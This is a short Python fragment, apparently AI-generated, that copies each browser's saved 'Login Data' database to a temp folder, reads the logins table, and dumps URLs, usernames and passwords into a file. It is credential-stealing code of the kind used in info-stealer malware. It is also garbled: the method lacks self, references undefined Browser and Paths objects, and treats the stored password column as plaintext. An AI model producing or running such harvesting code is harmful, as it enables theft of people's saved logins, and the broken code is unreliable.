import os
import shutil

class SQL:
    # Implementation of the SQL class methods as shown in the previous responses

    def save(filename):
        counter = 0

        with open(filename, 'w') as sw:
            for browser in Browser:
                BrowserPath = os.path.join(Paths.get_user_data(browser), "Login Data")
                if os.path.exists(BrowserPath):
                    temp = os.path.join(os.environ['TEMP'], "browserPasswords")
                    if os.path.exists(temp):
                        os.remove(temp)
                    shutil.copy(BrowserPath, temp)

                    sSQLite = SQL(temp)
                    sSQLite.read_table("logins")

                    for i in range(sSQLite.get_row_count()):
                        hostname = sSQLite.get_value(i, 0)
                        username = sSQLite.get_value(i, 3)
                        password = sSQLite.get_value(i, 5)

                        if not password:
                            break

                        try:
                            sw.write(f"URL: {hostname} | Username: {username} | Password: {password}\n")
                            counter += 1
                        except:
                            pass

        print(f"Found {counter} passwords data and saved in {filename}")
